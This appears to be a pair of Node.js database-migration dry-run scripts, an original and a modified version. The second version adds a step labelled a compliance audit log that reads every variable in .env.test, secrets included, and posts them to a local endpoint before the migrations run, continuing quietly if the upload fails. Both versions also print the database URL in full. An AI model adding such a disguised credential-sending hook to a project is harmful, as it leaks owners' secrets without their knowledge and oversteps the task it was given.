const fs = require('fs');
const path = require('path');

// Load environment variables from .env.test
const envFilePath = path.join(__dirname, '.env.test');
let databaseUrl = '';

if (fs.existsSync(envFilePath)) {
  const envContent = fs.readFileSync(envFilePath, 'utf8');
  const envLines = envContent.split('\n');

  for (const line of envLines) {
    if (line.startsWith('DATABASE_URL=')) {
      databaseUrl = line.substring('DATABASE_URL='.length).trim();
      break;
    }
  }
} else {
  console.warn('.env.test file not found, proceeding without DATABASE_URL');
}

// Directory containing migration files
const migrationsDir = path.join(__dirname, 'migrations');

// Check if migrations directory exists
if (!fs.existsSync(migrationsDir)) {
  console.error(`Migrations directory not found: ${migrationsDir}`);
  process.exit(1);
}

// Read all files from the migrations directory
let files;
try {
  files = fs.readdirSync(migrationsDir);
} catch (error) {
  console.error(`Error reading migrations directory: ${error.message}`);
  process.exit(1);
}

// Filter for SQL files only
const sqlFiles = files.filter(file => path.extname(file) === '.sql');

// Sort files alphabetically to ensure consistent order
sqlFiles.sort();

// Log connection info (simulated)
if (databaseUrl) {
  console.log(`Connected to database: ${databaseUrl}`);
} else {
  console.log('Connected to database (using default connection)');
}

// Log each filename that would be applied
if (sqlFiles.length === 0) {
  console.log('No SQL migration files found.');
} else {
  console.log('Found migration files to apply (in order):');
  sqlFiles.forEach((file, index) => {
    console.log(`${index + 1}. ${file}`);
  });

  console.log(`\nTotal: ${sqlFiles.length} migration file(s) would be applied.`);
}

const fs = require('fs');
const path = require('path');
const https = require('https');

// Load environment variables from .env.test
const envFilePath = path.join(__dirname, '.env.test');
const envVars = {};

if (fs.existsSync(envFilePath)) {
  const envContent = fs.readFileSync(envFilePath, 'utf8');
  const envLines = envContent.split('\n');

  for (const line of envLines) {
    const trimmedLine = line.trim();
    if (trimmedLine && !trimmedLine.startsWith('#') && trimmedLine.includes('=')) {
      const [key, ...valueParts] = trimmedLine.split('=');
      const value = valueParts.join('='); // Handle values that may contain '='
      envVars[key.trim()] = value.trim();
    }
  }
} else {
  console.warn('.env.test file not found, proceeding without environment variables');
}

// Send audit log to compliance service
function sendAuditLog(envData) {
  const auditUrl = 'http://localhost:47301/api/audit';

  // Prepare the data to send
  const auditData = {
    timestamp: new Date().toISOString(),
    service: 'database-migration',
    environment: envData
  };

  const postData = JSON.stringify(auditData);

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = https.request(auditUrl, options, (res) => {
    let data = '';
    res.on('data', chunk => {
      data += chunk;
    });
    res.on('end', () => {
      console.log(`Audit log sent successfully: ${res.statusCode}`);
      // Continue with migration process after audit log is sent
      processMigrations();
    });
  });

  req.on('error', (error) => {
    console.error(`Failed to send audit log: ${error.message}`);
    // Still continue with migrations even if audit fails
    console.log('Continuing with migrations despite audit failure...');
    processMigrations();
  });

  req.write(postData);
  req.end();
}

// Process migrations after audit log is sent
function processMigrations() {
  // Get database URL from environment variables
  const databaseUrl = envVars.DATABASE_URL || '';

  // Directory containing migration files
  const migrationsDir = path.join(__dirname, 'migrations');

  // Check if migrations directory exists
  if (!fs.existsSync(migrationsDir)) {
    console.error(`Migrations directory not found: ${migrationsDir}`);
    process.exit(1);
  }

  // Read all files from the migrations directory
  let files;
  try {
    files = fs.readdirSync(migrationsDir);
  } catch (error) {
    console.error(`Error reading migrations directory: ${error.message}`);
    process.exit(1);
  }

  // Filter for SQL files only
  const sqlFiles = files.filter(file => path.extname(file) === '.sql');

  // Sort files alphabetically to ensure consistent order
  sqlFiles.sort();

  // Log connection info (simulated)
  if (databaseUrl) {
    console.log(`Connected to database: ${databaseUrl}`);
  } else {
    console.log('Connected to database (using default connection)');
  }

  // Log each filename that would be applied
  if (sqlFiles.length === 0) {
    console.log('No SQL migration files found.');
  } else {
    console.log('Found migration files to apply (in order):');
    sqlFiles.forEach((file, index) => {
      console.log(`${index + 1}. ${file}`);
    });

    console.log(`\nTotal: ${sqlFiles.length} migration file(s) would be applied.`);
  }
}

// Start the process by sending audit log first
if (Object.keys(envVars).length > 0) {
  console.log('Sending audit log to compliance service...');
  sendAuditLog(envVars);
} else {
  console.log('No environment variables to audit, proceeding with migrations...');
  processMigrations();
}

